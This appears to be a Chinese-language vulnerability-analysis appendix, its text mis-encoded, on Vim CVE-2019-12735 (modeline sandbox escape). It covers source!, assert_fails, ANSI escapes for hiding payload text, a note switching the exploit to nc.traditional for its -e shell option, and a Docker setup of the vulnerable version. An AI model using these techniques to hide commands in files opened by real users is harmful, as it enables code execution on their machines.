# Vimæ¼æ´åˆ†æé™„ä»¶(cve-2019-12735)

### èƒŒæ™¯çŸ¥è¯†

#### Vimçš„æ¨¡å¼

[å‚è€ƒï¼šhttp://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro](http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro)  

**Normal mode**

é€šè¿‡ $ vim file æ‰“å¼€æ–‡ä»¶åè¿›å…¥çš„æ¨¡å¼

```shell
$ vim hello.txt
Hello
~                                                                     
~                                                                      
~                                                                      ...
~                                                                               
"hello.txt" 1L, 6C

```

é€šè¿‡source!åŠ è½½çš„è„šæœ¬çš„å†…å®¹ï¼Œå°±æ˜¯ç›¸å½“äºåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹è¾“å…¥çš„å†…å®¹

**Command-line mode**

- åœ¨normal modeä¸‹è¾“å…¥`: ( and / ? )`è¿›å…¥Command-line mode

- åœ¨Vimçš„Command-lineæ¨¡å¼ä¸‹ï¼Œå¯ä»¥æ‰§è¡ŒVim commands
- å…¶ä¸­ï¼Œé€šè¿‡ `:!{shell cmd}` å¯ä»¥æ‰§è¡Œshellå‘½ä»¤

```shell
# http://vimdoc.sourceforge.net/htmldoc/various.html#:!
$ vim
:!uname -a

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue

```

**Ex mode**

- é€šè¿‡`$ vim -e  file `è¿›å…¥è¯¥æ¨¡å¼

- ä¹Ÿå¯ä»¥åœ¨Normal modeä¸‹è¾“å…¥Qè¿›å…¥è¯¥æ¨¡å¼
- è¿™ä¸ªæ¨¡å¼çš„ç‰¹ç‚¹æ˜¯å¯ä»¥è¿ç»­æ‰§è¡ŒVim commandï¼Œå¯ä»¥ç±»æ¯” python çš„å‘½ä»¤è¡Œæ¨¡å¼
- é€šè¿‡sourceåŠ è½½çš„è„šæœ¬çš„å†…å®¹ï¼Œå°±æ˜¯ç›¸å½“äºåœ¨è¿™ä¸ªæ¨¡å¼ä¸‹è¾“å…¥çš„å†…å®¹

**Insert mode**

- åœ¨Normal modeä¸‹è¾“å…¥iå¯ä»¥è¿›å…¥Insert mode, è¿™ä¸ªæ¨¡å¼ç›¸å½“äºç¼–è¾‘æ¨¡å¼ï¼Œå¤§éƒ¨åˆ†æ“ä½œå’Œåœ¨è®°äº‹æœ¬ä¸­ä¸€æ ·ã€‚

- å¦å¤–è¿˜æœ‰ "I", "a", "A", "o", "O", "c", "C", "s" or S"ä¹Ÿå¯ä»¥ä»Normal modeè¿›å…¥Insert mode.

- å…·ä½“æ¨¡å¼è½¬æ¢è§: [http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro](http://vimdoc.sourceforge.net/htmldoc/intro.html#vim-modes-intro)

- å…¶ä¸­"S"è¡¨ç¤ºå‰ªåˆ‡å½“å‰è¡Œï¼Œå¹¶è¿›å…¥Insert mode

```shell
# :help S
# ["x]S                   Delete [count] lines [into register x] and start
#                        	insert.  Synonym for "cc" |linewise|.

# Demoæ¼”ç¤º
$ vim 1.vim
:let i = 1
:while i < 10
:    let a = getline(i)
:    if empty(a)
:        break
:    endif
:    echo "Line:" i "is"  a
:    let i += 1
:endwhile
~                                                                      
...     
~                                                                               
"1.vim" 9L, 147C

S(shift+s)


:while i < 10
:    let a = getline(i)
:    if empty(a)
:        break
:    endif
:    echo "Line:" i "is"  a
:    let i += 1
:endwhile
~                                                                      ...
~
                                                               
-- INSERT --
<ESC>
p  (pæ˜¯ç²˜è´´)
p


:let i = 1
:let i = 1
:while i < 10
:    let a = getline(i)
:    if empty(a)
:        break
:    endif
:    echo "Line:" i "is"  a
:    let i += 1
:endwhile
~                                                                      ...
     

```



#### Vim optionsçš„æ¦‚å¿µ

Vimçš„optionsç›¸å½“äºç¼–è¾‘å™¨çš„é…ç½®ï¼Œé€šè¿‡command-lineæ¨¡å¼çš„:setå‘½ä»¤æ‰‹åŠ¨é…ç½®ï¼Œä¹Ÿå¯ä»¥é€šè¿‡è„šæœ¬è‡ªåŠ¨é…ç½®ï¼Œè‡ªåŠ¨é…ç½®çš„æ–¹æ³•ä¸»è¦æ˜¯é€šè¿‡Vimè„šæœ¬(.vimrc, .exrc)æˆ–è€…modelineæ–¹å¼ã€‚



#### Vimçš„modelineåŠŸèƒ½

- å‚è€ƒ1: [http://vimdoc.sourceforge.net/htmldoc/options.html#modeline](http://vimdoc.sourceforge.net/htmldoc/options.html#modeline)

- å‚è€ƒ2: [https://vim.fandom.com/wiki/Modeline_magic](http://vimdoc.sourceforge.net/htmldoc/options.html#modeline)

modelineç”¨äºåœ¨æ–‡æœ¬æ–‡ä»¶çš„é¦–éƒ¨æˆ–è€…å°¾éƒ¨è®¾ç½®vim options, è®©vimæ‰“å¼€æ–‡ä»¶çš„æ—¶å€™è‡ªåŠ¨åŠ è½½å¹¶æ‰§è¡Œè¯¥é…ç½®

```shell

# modeline æœ‰ä¸¤ç§æ ¼å¼
# ç¬¬ä¸€ç§æ ¼å¼ï¼š [text]{white}{vi:|vim:|ex:}[white]{options}
#							vi:noai:sw=3 ts=6 
# - textå¯ä»¥ç”¨æ¥æ”¾ç½®ç¼–ç¨‹è¯­è¨€çš„æ³¨é‡Š(pythonçš„ # , C çš„// )ï¼Œæ˜¯å¯é€‰çš„
# - vi:ä¹‹å‰ä¸€å®šè¦æœ‰ç©ºæ ¼
# - optionsç”¨":"æˆ–è€…ç©ºæ ¼åˆ†éš”


# ç¬¬äºŒç§æ ¼å¼ï¼š	
#  [text]{white}{vi:|vim:|ex:}[white]se[t] {options}:[text]
# 				/* vim: set ai tw=75: */ 
# - é¦–å°¾éƒ½å¯ä»¥ç”¨textä¸»è¦æ˜¯æ”¯æŒ(Cçš„è¿™ç§æ³¨é‡Š "/**/")ï¼Œé¦–å°¾çš„textéƒ½æ˜¯å¯é€‰çš„
# - vim: åé¢è¦æœ‰ç©ºæ ¼
# - è¦æœ‰ä¸€ä¸ªset(å¯ä»¥ç¼©å†™æˆ seï¼Œåé¢è·Ÿç©ºæ ¼)
# - optionsç”¨ç©ºæ ¼åˆ†éš”
# - ç»“å°¾è¦æœ‰å†’å· : 

```



å¼€å¯modeline

```shell
# ç¼–è¾‘~/.vimrc
# æ·»åŠ ï¼š
set modeline
set modelines=5
	
```

å…·ä½“ä½¿ç”¨

```shell
# ç”¨Vimæ‰“å¼€æ–‡æœ¬ï¼š
$ vim a.py
# python3
# coding=utf-8
import platform

def func1():
        for i in range(10):
                print("hello vim")
                print(platform.platform())
# cursor is here 

def main():
        func1()

main()


# æ‰“å¼€a.pyå, é»˜è®¤çš„tabé•¿åº¦æ˜¯8ä¸ªç©ºæ ¼ï¼Œä¸æ”¯æŒå›è½¦è‡ªåŠ¨ç¼©è¿›
# å¯ä»¥é€šè¿‡tabstopå’Œautoindentä¸¤ä¸ªé€‰é¡¹æ¥é…ç½®
:set tabstop=4
:set autoindent


# æ•ˆæœå¦‚ä¸‹ï¼š
# python3
# coding=utf-8
import platform

def func1():
    for i in range(10):
        print("hello vim")
        print(platform.platform())
        # cursor is here

def main():
    func1()

main()


# ä½†æ˜¯ä¸‹æ¬¡æ‰“å¼€åï¼Œåˆéœ€è¦å†é…ç½®ä¸€æ¬¡
# å¯ä»¥é€šè¿‡modelineæ¥ä½¿è¿™ä¸ªé…ç½®æ¯æ¬¡æ‰“å¼€a.pyæ–‡ä»¶æ—¶éƒ½ç”Ÿæ•ˆ
# åœ¨æ–‡ä»¶å¼€å¤´æ·»åŠ ä¸€è¡Œå†…å®¹ï¼š # vim: set tabstop=4 autoindent: 
# å†æ¬¡æ‰“å¼€æ•ˆæœå¦‚ä¸‹ï¼š

$ vim a.py
# vim: set tabstop=4 autoindent: 
# python3
# coding=utf-8
import platform


def func1():
    for i in range(10):
        print("hello vim")
        print(platform.platform())
        # cursor is here

def main():
    func1()

main()



```

`
For security reasons, only a subset of options is permitted in modelines, and if the option value contains an expression, it is executed in a sandbox
`  
ä¸ºäº†å®‰å…¨åŸå› ï¼Œåªæœ‰éƒ¨åˆ†optionså¯ä»¥åœ¨modelineä¸­é…ç½®ï¼Œå¦‚æœoptionçš„å€¼æ˜¯ä¸€ä¸ªè¡¨è¾¾å¼(æ¯”å¦‚é…ç½®foldexpr)ï¼Œé‚£ä¹ˆè¡¨è¾¾å¼ä¼šåœ¨vimçš„sandboxä¸­æ‰§è¡Œ
  



#### Vimè¡¨è¾¾å¼å’Œè„šæœ¬

æ ¹æ®Vim Scriptè¯­æ³•ç¼–å†™Vimè„šæœ¬ï¼Œå‚è€ƒï¼š

[https://github.com/name5566/vim-config/blob/master/vim_script.md](https://github.com/name5566/vim-config/blob/master/vim_script.md)
[http://vimdoc.sourceforge.net/htmldoc/usr_41.html](http://vimdoc.sourceforge.net/htmldoc/usr_41.html)
[http://vimdoc.sourceforge.net/htmldoc/eval.html](http://vimdoc.sourceforge.net/htmldoc/eval.html)
[http://vimdoc.sourceforge.net/htmldoc/eval.html#functions](http://vimdoc.sourceforge.net/htmldoc/eval.html)



```shell
# åˆ›å»ºä¸€ä¸ªVimè„šæœ¬1.vim
$ vim 1.vim


# æŒ‰ç…§Vim Scriptè¯­æ³•ç¼–è¾‘è„šæœ¬
:let i = 1
:while i < 10
:    let a = getline(i)
:    if empty(a) 
:        break
:    endif
:    echo "Line:" i "is"  a
:    let i += 1
:endwhile


# ä¿å­˜
:w


# ç”¨sourceæŒ‡ä»¤åŠ è½½è‡ªå·±å¹¶æ‰§è¡Œ
:source % 
# or
:source 1.vim


# æ‰§è¡Œç»“æœï¼š
Line: 1 is :let i = 1
Line: 2 is :while i < 10
Line: 3 is :    let a = getline(i)
Line: 4 is :    if empty(a)
Line: 5 is :        break
Line: 6 is :    endif
Line: 7 is :    echo "Line:" i "is"  a
Line: 8 is :    let i += 1
Line: 9 is :endwhile
Press ENTER or type command to continue



# åœ¨ç¼–è¾‘å…¶ä»–æ–‡ä»¶çš„æ—¶å€™åŠ è½½å¹¶æ‰§è¡Œä¸€ä¸ªVimè„šæœ¬
$ vim a.txt
Hello
Vim
Goodbye!
~         
:source 1.vim


Line: 1 is Hello
Line: 2 is Vim
Line: 3 is Goodbye!
Press ENTER or type command to continue


```



#### sourceå‘½ä»¤

sourceå‘½ä»¤ç”¨äºä»Vimè„šæœ¬æ–‡ä»¶ä¸­è¯»å–VimæŒ‡ä»¤å¹¶æ‰§è¡Œï¼Œå‚è€ƒï¼š[http://vimdoc.sourceforge.net/htmldoc/repeat.html#using-scripts](http://vimdoc.sourceforge.net/htmldoc/repeat.html#using-scripts)

```shell
:help source

:so[urce] {file}        
  Read Ex commands from {file}.  
  These are commands that start with a ":".


:so[urce]! {file}       
  Read Vim commands from {file}.  
  These are commands that are executed from Normal mode, 
  like you type them.
                     

```

sourceå’Œsource!çš„åŒºåˆ«åœ¨äºï¼š

- sourceæ˜¯ä»æ–‡ä»¶è¯»å– Ex commands, ä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶çš„å†…å®¹å¿…é¡»æ˜¯ :cmd çš„å½¢å¼
- source!æ˜¯ä»æ–‡ä»¶è¯»å– Normal modeä¸‹æ‰§è¡Œçš„vim commands, ä¹Ÿå°±æ˜¯è¯´æ–‡ä»¶ä¸­çš„```<ESC> i /``` å­—ç¬¦è¿™äº›éƒ½ä¼šå½“æˆNormal modeä¸‹çš„ç”¨æˆ·è¾“å…¥(like you type them)

```shell
# åˆ›å»ºä¸€ä¸ªvimè„šæœ¬ï¼Œå†™å…¥å†…å®¹iHello,Worldåä¿å­˜
$ vim 5.vim
iHello,World

:wq

# ç”¨source! åŠ è½½å¹¶æ‰§è¡Œè„šæœ¬
$ vim 
:source! 5.vim

# æ•ˆæœå¦‚ä¸‹ï¼Œæ‰“å¼€åç›´æ¥è¿›å…¥äº†Insert mode
Hello,World

~                                                                      
~                                                                      
...                                                                    
~                                                                       
~                                                                                                        
-- INSERT --


# è€Œç”¨sourceåŠ è½½åˆ™ä¼šæŠ¥é”™
$ vim 
:source 5.vim


Error detected while processing 5.vim:
line    1:
E492: Not an editor command: iHello,World
Press ENTER or type command to continue


```



#### vimæ‰§è¡Œshellå‘½ä»¤

é€šè¿‡åœ¨command-line modeä¸‹ï¼Œä½¿ç”¨ !{cmd}æ¥æ‰§è¡Œshellå‘½ä»¤

```shell
$ vim
:!uname -a

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue


```



```shell
# ä¸€ä¸ªå¯ä»¥æ‰§è¡Œshellå‘½ä»¤çš„vimè„šæœ¬
$ vim a.vim
<i>
:!uname -a
~
~
<ESC>
:source %

... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64

Press ENTER or type command to continue

# ç‰¹æ®Šçš„å‡½æ•°execute
# $ vim
# :help execute()
#  execute({command} [, {silent}])                                 *execute()*
#                 Execute an Ex command or commands and return the output as a
#                 string. 
#                 {command} can be a string or a List.  In case of a List the
#                 lines are executed one by one. 
# ...
                        
#                 The optional {silent} argument can have these values:
#                         ""              no `:silent` used
#                         "silent"        `:silent` used
#                         "silent!"       `:silent!` used
# 								The default is "silent".  
# 								Note that with "silent!", unlike `:redir`, error messages are dropped
# ...


$ vim b.vim
: call execute("source a.vim", "")


... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64


Press ENTER or type command to continue


# executeå‡½æ•°åœ¨ubuntuä¸Šå®‰è£…çš„Vimä¸­æ²¡æœ‰ï¼Œä½†æ˜¯è¿˜æœ‰å¦ä¸€ä¸ªå¯ä»¥æ‰§è¡Œshellå‘½ä»¤ï¼šassert_fails()
# $ vim
# :help assert_fails
# 
# assert_fails({cmd} [, {error}])                                 *assert_fails()*
#                 Run {cmd} and add an error message to |v:errors| if it does
#                 NOT produce an error.
#                 When {error} is given it must match in |v:errmsg|.
$ vim b.vim
: call assert_fails("source a.vim")


... Darwin Kernel Version 18.2.0: Thu Dec 20 20:46:53 PST 2018; root:xnu-4903.241.1~1/RELEASE_X86_64 x86_64


Press ENTER or type command to continue


```



#### silentå‘½ä»¤

```shell
# :help silent
#                              *:sil* *:silent* *:silent!*
# :sil[ent][!] {command}  
#    Execute {command} silently.  
#    Normal messages will not
#    be given or added to the message history.
#    When [!] is added, error messages will also be
#    skipped, and commands and mappings will not be aborted
#    when an error is detected.



# 1. ç¼–å†™ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸ä½¿ç”¨silentï¼Œä¿å­˜åä¼šåœ¨åº•éƒ¨å‡ºç°å›æ˜¾ä¿¡æ¯
vim 1.txt
i
something 
~                                                                      ...     
~       
<ESC>
:w                                                                   
"a.vim" 1L, 11C written

# 2. ä½¿ç”¨silentï¼Œwå‘½ä»¤çš„å›æ˜¾ä¿¡æ¯å°±æ¶ˆå¤±äº†
vim 1.txt
i
somenthing
~                                                                       ...   
~                                                                               
:silent! w

# 3. silent! å¯ä»¥ç”¨æ¥å»é™¤é”™è¯¯ä¿¡æ¯
vim 1.txt
i
something
<ESC>
:w
:file | silent! Anycommand or anytext'\' \; "

something
~                                                                      ...
~                                                                                                                                           
"1.vim" line 1 of 1 --100%-- col 9


```



#### redrawå‘½ä»¤

```shell
# :help redraw!
#                                             *:redr*  *:redraw*
# :redr[aw][!]            
#  Redraw the screen right now.  
#  When ! is included it is cleared first.
#                         ... 
# ç«‹åˆ»åˆ·æ–°å±å¹•ï¼Œå¦‚æœè®¾ç½®äº†!åˆ™å…ˆæ¸…é™¤å±å¹•å†…å®¹
# æ¯æ¡å‘½äº†æ‰§è¡Œå®Œï¼Œåº•éƒ¨ä¼šç•™ä¸‹å†å²è®°å½•ï¼Œ redraw!ä¼šæ¸…é™¤æ‰è®°å½•

# å±å¹•ä¼šæ¸…ç©º
vim 1.txt
i
somenthing
~                                                                       ...   
~                                                                               
:silent! w
:redraw!

something
~                                                                       ...
~                                                                            

```



#### fileå‘½ä»¤

```shell
# è¾“å…¥å½“å‰æ–‡ä»¶ä¿¡æ¯
vim 1.txt
i
something
<ESC>
:w
:file
something
~                                                                      ...
~                                                                                                                                           
"1.vim" line 1 of 1 --100%-- col 9



```



#### systemå‡½æ•°

```shell
system({expr} [, {input}])                              *system()* *E677*
Get the output of the shell command {expr} as a string.  
... 

$ vim
:let a = system('pwd')
:echo a

~                                                                      
/home/invincible/Desktop/test/vim_test

Press ENTER or type command to continue


```



#### assert_failså‡½æ•°

æ‰§è¡Œä¸€ä¸ªvim command, å¦‚æœæ²¡æœ‰å‡ºé”™ï¼Œåˆ™å°†commandçš„æ‰§è¡Œä¿¡æ¯ä¿å­˜åˆ°v:errorså…¨å±€å˜é‡ä¸­

```shell
:help assert_fails

assert_fails({cmd} [, {error}])                                
  Run {cmd} and add an error message to |v:errors| 
  if it does NOT produce an error.
  When {error} is given it must match in |v:errmsg|.

```



```shell
$ vim
:call assert_fails("echo 'hello'")

~
...
~
hello

:echo v:errors
['command did not fail: echo ''hello''']

```



ç¼–å†™ä¸€ä¸ªå¯ä»¥æ‰§è¡Œshellå‘½ä»¤çš„vimè„šæœ¬

```shell

$ vim a.vim
<i>
:!uname -a
~
~
<ESC>
:wq

# ç”¨assert_faildæ‰§è¡Œvimçš„sourceæŒ‡ä»¤ï¼ŒåŠ è½½vimè„šæœ¬a.vim
$ vim
:call assert_fails("source a.vim")

Linux ubuntu 4.4.0-112-generic #135-Ubuntu SMP Fri Jan 19 11:48:36 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux

Press ENTER or type command to continue

:echo v:errormsg
['command did not fail: source a.vim']

```



#### Vimçš„foldingåŠŸèƒ½

- vimçš„foldingåŠŸèƒ½ç”¨äºå¯¹æ–‡æœ¬ä¸­çš„æ–‡æœ¬å—ï¼ˆæ¯”å¦‚ä¸€ä¸ªå‡½æ•°ï¼Œä¸€æ®µæ³¨é‡Šï¼‰æŠ˜å å’Œå±•å¼€ï¼Œå¯ä»¥ç±»æ¯”ä¸ºå›¾å½¢åŒ–ç¼–è¾‘å™¨ç¼–è¾‘åŒºä¾§æ çš„(+/-)ã€‚

- foldmethodé€‰é¡¹æ˜¯ç”¨æ¥é…ç½®Vimçš„ä»£ç æŠ˜å åŠŸèƒ½çš„ï¼ŒVimç»™å‡ºäº†manual, indent, expr, syntax, diff, markerè¿™å‡ ç§ä»£ç æŠ˜å çš„æ–¹å¼ï¼Œä¸‹é¢ğŸ‘‡æ˜¯indentæ–¹å¼çš„æ•ˆæœï¼š

```shell
# æ–‡æœ¬å¦‚ä¸‹
$ vim a.py

# python3
# coding=utf-8
import platform

def func1():
        for i in range(10):
                print("hello vim")
                print(platform.platform())

def main():
        func1()

main()


# 1. è®¾ç½®foldmethodé€‰é¡¹
:set foldenable
:set foldmethod=indent

# æ•ˆæœå¦‚ä¸‹
# python3
# coding=utf-8
import platform

def func1():
+--  3 lines: for i in range(10):-------------------------------------

def main():
        func1()

main()


```

  

  å¦‚æœä¸æ»¡è¶³äºç»™å®šçš„å‡ ç§æ–¹å¼ï¼Œå¯ä»¥å°†foldmethodè®¾ç½®ä¸ºexpræ¥è‡ªå®šä¹‰ä»£ç å—çš„ç‰¹å¾

```shell
# æ–‡æœ¬å¦‚ä¸‹
$ vim a.py

# python3
# coding=utf-8
import platform

def func1():
        for i in range(10):
                print("hello vim")
                print(platform.platform())

def main():
        func1()


main()

:set foldenable
:set foldmethod=expr
:set foldexpr=getline(v:lnum)[0]==\"#\"
# foldexprç”¨äºè®¾ç½®æ–‡æœ¬æ»¡è¶³çš„æ¡ä»¶ï¼Œæ»¡è¶³æ¡ä»¶çš„æ–‡æœ¬å—ä¼šè¢«æŠ˜å 
# è¯¥é…ç½®çš„æ„æ€æ˜¯é€šè¿‡Vimçš„getlineå‡½æ•°ï¼Œåˆ¤æ–­æ¯ä¸€è¡Œæ–‡æœ¬çš„ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯å¦ä¸º"#"ï¼Œå°†æ»¡è¶³æ¡ä»¶çš„ç›¸é‚»çš„è¡Œè§†ä¸ºä¸€ä¸ªæ–‡æœ¬å—ï¼Œå¹¶å°†å…¶æŠ˜å 
# æ•ˆæœå¦‚ä¸‹: 

+--  2 lines: # python3-----------------------------------------------
import platform

def func1():
        for i in range(10):
                print("hello vim")
                print(platform.platform())
                
def main():
        func1()
        
main()



```

  

#### vimçš„sandboxæ¦‚å¿µ

```shell
11. The sandbox					*eval-sandbox* *sandbox* *E48*


The 'foldexpr', 'formatexpr', 'includeexpr', 'indentexpr', 'statusline' and
'foldtext' options may be evaluated in a sandbox. 


This gives some safety for when these options are set from a modeline.  


These items are not allowed in the sandbox:
	- changing the buffer text
	- defining or changing mapping, autocommands, functions, user commands
	- setting certain options (see |option-summary|)
	- setting certain v: variables (see |v:var|)  *E794*
	- executing a shell command
	- reading or writing a file
	- jumping to another buffer or editing a file
	- executing Python, Perl, etc. commands
	

```



#### ANSI escape codes

å‚è€ƒï¼š

[https://www.gnu.org/software/screen/manual/html_node/Control-Sequences.html](https://www.gnu.org/software/screen/manual/html_node/Control-Sequences.html)  
[https://notes.burke.libbey.me/ansi-escape-codes/](https://notes.burke.libbey.me/ansi-escape-codes/)  
[https://learnku.com/articles/26231](https://learnku.com/articles/26231)  

##### \x1b[1G 

\x1b[1G å…‰æ ‡ç§»åŠ¨åˆ°å½“å‰è¡Œçš„ç¬¬Pnä¸ªä½ç½®

```shell
# ESC [ Pn G                      Cursor horizontal position
# $ echo -e "Hello\x1b[1GA" > a.txt
# $ cat a.txt
# Aello
# $ echo -e "Hello\x1b[2GA" > a.txt
# $ cat a.txt
# HAllo
# $ echo -e "Hello\x1b[3GA" > a.txt
# $ cat a.txt
# HeAlo

```



##### \x1b[D 

\x1b[D å…‰æ ‡å·¦ç§»1ä¸ªä½ç½®

```shell
# ESC [ Pn D                      Cursor Left
# å…‰æ ‡å·¦ç§»Pnä¸ªä½ç½®
# $ echo -e "Hello\x1b[D" > a.txt
# $ cat a.txt
# Hello
# $ echo -e "Hello\x1b[D\x1b[D\x1b[DAAA" > a.txt
# $ cat a.txt
# HeAAA
# $ echo -e "Hello\x1b[5DAAA" > a.txt
# $ cat a.txt
# AAAlo

```



##### \x1b[K 

\x1b[K æ¸…é™¤å…‰æ ‡åˆ°å½“å‰ä½ç½®çš„å†…å®¹

```shell
# *  ESC [ K           erase to end of line (inclusive)
# æ¸…é™¤å…‰æ ‡åˆ°å½“å‰ä½ç½®çš„å†…å®¹(ä¸ä¼šæ”¹å˜æ–‡æœ¬)ï¼Œå¯ä»¥é…åˆ\x1b[Gä½¿ç”¨
$ echo -e "AAAA\x1b[1G\x1b[KBBBB" > a.txt
$ cat  a.txt
BBBB
$ echo -e "ABCD\x1b[2G\x1b[KEEEE" > a.txt
$ cat  a.txt
AEEEE
$ echo -e "ABCD\x1b[3G\x1b[KEEEE" > a.txt
$ cat a.txt 
ABEEEE
$ echo -e "ABCD\x1b[KEEEE" > a.txt
$ cat a.txt 
ABCDEEEE

```



##### \x1b[2K 

![cve-2019-12735-01_p1.png](img/cve-2019-12735-01_p1.png)      



##### \x1b[?7l 

- ESC [ ? 7 l       auto wrap off  
- \x1b[?7l å…³é—­è‡ªåŠ¨æ¢è¡Œ (l -> low)

- \x1b[?7h å¼€å¯è‡ªåŠ¨æ¢è¡Œ (h -> high)
- è¿™ä¸ªå‘½ä»¤çš„åŠŸèƒ½æ˜¯æ§åˆ¶Terminalçš„æ˜¾ç¤ºåŠŸèƒ½ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æœæ–‡æœ¬é•¿åº¦è¶…è¿‡Terminalçš„æ˜¾ç¤ºé•¿åº¦ï¼Œåˆ™ä¼šè‡ªåŠ¨æ¢è¡Œï¼Œå¦‚æœå…³é—­äº†è‡ªåŠ¨æ¢è¡Œï¼Œåˆ™ä¼šå…¨éƒ¨æ˜¾ç¤ºåœ¨ä¸€è¡Œï¼Œè¶…å‡ºçš„éƒ¨åˆ†è¢«"æˆªæ–­"

â€‹![cve-2019-12735-01_p2.png.png](img/cve-2019-12735-01_p2.png)      



\x1b[?7l å’Œ \x1b[1G é…åˆä½¿ç”¨çš„æ•ˆæœï¼š

ä½¿ç”¨å‰ ï¼š     
![cve-2019-12735-01_p3.png](img/cve-2019-12735-01_p3.png)               

ä½¿ç”¨åï¼š

![cve-2019-12735-01_p4.png](img/cve-2019-12735-01_p4.png)      


\x1b[?7l å’Œ \x1b[1G + \x1b[K é…åˆä½¿ç”¨çš„æ•ˆæœï¼š        
![cve-2019-12735-01_p5.png](img/cve-2019-12735-01_p5.png)      



##### \x16

å‚è€ƒ:

[http://defindit.com/ascii.html](http://defindit.com/ascii.html)  
[https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6](https://zh.wikipedia.org/wiki/%E6%8E%A7%E5%88%B6%E5%AD%97%E7%AC%A6)  

è¿™æ˜¯ä¸€ä¸ªasciiç çš„æ§åˆ¶å­—ç¬¦ï¼Œä»£è¡¨ ctrl+vï¼Œå®ƒçš„åŠŸèƒ½å¯ä»¥ç†è§£ä¸ºï¼šè®©ä¸‹ä¸€ä¸ªè¾“å…¥è¯†åˆ«ä¸ºæ™®é€šå­—ç¬¦

```shell
$ cat a.py
a = input("> ")
print(ord(a[0]))

$ python3 a.py
# æƒ³ç›´æ¥è¾“å…¥ctrl+c, ä½†ç¨‹åºé€€å‡ºï¼Œè¢«è¯†åˆ«æˆäº†ä¸­æ–­ä¿¡å·
> ^CTraceback (most recent call last):
  File "a.py", line 1, in <module>
    a = input("> ")
KeyboardInterrupt

$ python3 a.py
# ä¾æ¬¡æŒ‰ä¸‹ctrl+vå’Œctrl+c, å°±é¡ºåˆ©æ‰“å°å‡ºäº†ctrl+cçš„asciiç 
> ^C
3

```



ä¸ºä»€ä¹ˆExpä¸­éœ€è¦\x16æ§åˆ¶å­—ç¬¦

```shell
echo -e "iHello\x1b[D" > a.vim
$ vim 
:source! a.vim

Hello
~                                                                      ...   
~                                                                               
E388: Couldn't find definition

è¿™ä¸ªæŠ¥é”™å¯ä»¥æ‰‹åŠ¨è¾“å…¥ä¸‹é¢çš„æŒ‡ä»¤äº§ç”Ÿï¼š
$ vim
i
Hello
<ESC>
[
shift+d

# å¦‚æœåŠ ä¸Š\x16åˆ™\x1bä¸ä¼šè¢«è§£ææˆ<ESC>æŒ‰é”®ï¼Œè€Œæ˜¯è¾“å…¥å­—ç¬¦
echo -e "iHello\x16\x1b[D" > a.vim

Hello^[[D
~                                                                      ...
~
  
-- INSERT --




```



### expä¿®æ”¹è¯´æ˜

-  nc -> nc.traditional 

  Ubuntuä¸Šçš„ncä¸åŒ…å«-eé€‰é¡¹ï¼Œè§£å†³åŠæ³•æ˜¯å®‰è£…nc.traditionalæ¥æ›¿ä»£ncå‘½ä»¤

- \x1b[K -> \x1b[2K å’Œ \x1b[D -> \x1b[2D å’Œç©ºæ ¼æ˜¯ç”¨äºæ¸…é™¤ä¸å¯è§å­—ç¬¦\x16å’Œå¼•å·

  ä¿®æ”¹å‰: 

  ![cve-2019-12735-01_p6.png](img/cve-2019-12735-01_p6.png)

  ![cve-2019-12735-01_p7.png](img/cve-2019-12735-01_p7.png)       

  

  ä¿®æ”¹å:        
  ![cve-2019-12735-01_p8.png](img/cve-2019-12735-01_p8.png)               

  ![cve-2019-12735-01_p9.png](img/cve-2019-12735-01_p9.png)       



### Vimå®‰è£…

#### aptè‡ªåŠ¨å®‰è£…

```shell
apt-get install vim-runtime=2:7.4.1689-3ubuntu1
apt-get install vim-common=2:7.4.1689-3ubuntu1
apt-get install vim=2:7.4.1689-3ubuntu1

```



#### ä½¿ç”¨debåŒ…å®‰è£…

é“¾æ¥:[https://pan.baidu.com/s/1rn0RqwWn0tpgk9PY0v00Jw](https://pan.baidu.com/s/1rn0RqwWn0tpgk9PY0v00Jw) å¯†ç :m0qc

```shell
sudo dpkg -i vim_2%3a7.4.1689-3ubuntu1_amd64.deb
```



#### ä¸‹è½½æºç æ‰‹åŠ¨ç¼–è¯‘

```shell
# ä¸‹è½½æºç ï¼Œç¼–è¯‘ç”Ÿæˆç¬¦å·
# å‚è€ƒï¼šhttps://www.unix.com/programming/156665-compile-debug-vim-source-code.html
$ mkdir ~/MyVim
$ cd ~/MyVim
$ sudo apt-get install libncurses5-dev libncursesw5-dev
$ apt-get source vim=2:7.4.1689-3ubuntu1
$ cd src
$ cp Makefile Makefile.orig
$ vim Makefile
$ diff Makefile Makefile.orig
540c540
< CFLAGS = -g
---
> #CFLAGS = -g
908c908
< prefix = ~/MyVim
---
> #prefix = $(HOME)
1852c1852
< #    $(STRIP) $(DEST_BIN)/$(VIMTARGET)
---
>     $(STRIP) $(DEST_BIN)/$(VIMTARGET)
$ cd ..
$ make && make install
$ cd bin
$ gdb ./vim

```



#### Dockerå¤ç°ç¯å¢ƒæ­å»º

å¯ä»¥é€šè¿‡Dockerå¿«é€Ÿæ­å»ºpocå¤ç°ç¯å¢ƒ

```shell
$ ls
Dockerfile
$ cat Dockerfile
From ubuntu:16.04
RUN set -e -x ;\
    apt update ;\
    apt-get install -y vim-runtime=2:7.4.1689-3ubuntu1 ;\
    apt-get install -y vim-common=2:7.4.1689-3ubuntu1 ;\
    apt-get install -y vim=2:7.4.1689-3ubuntu1 ;\
